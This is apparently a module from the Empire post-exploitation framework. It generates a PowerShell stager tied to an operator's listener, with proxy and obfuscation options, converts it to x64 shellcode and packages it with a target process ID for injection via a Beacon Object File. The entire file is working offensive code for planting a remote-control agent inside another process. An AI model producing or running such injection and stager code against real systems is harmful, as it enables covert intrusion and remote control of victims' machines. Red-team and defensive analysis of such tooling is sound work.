import base64

from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        params["Architecture"] = "x64"
        script_file, script_end = main_menu.modulesv2.generate_bof_data(
            module=module, params=params, obfuscate=obfuscate
        )

        # staging options
        listener_name = params["Listener"]
        pid = params["pid"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        launcher_obfuscation_command = params["ObfuscateCommand"]
        language = params["Language"]
        launcher_obfuscation = params["Obfuscate"]

        launcher = main_menu.stagers.generate_launcher(
            listener_name,
            language=language,
            encode=False,
            obfuscate=launcher_obfuscation,
            obfuscation_command=launcher_obfuscation_command,
            userAgent=user_agent,
            proxy=proxy,
            proxyCreds=proxy_creds,
        )

        script_end += f" -i:{pid}"

        shellcode, err = main_menu.stagers.generate_powershell_shellcode(
            launcher, arch="x64", dot_net_version="net40"
        )
        shellcode = base64.b64encode(shellcode).decode("utf-8")
        script_end += f" -b:{shellcode}"

        return f"{script_file}|{script_end}"
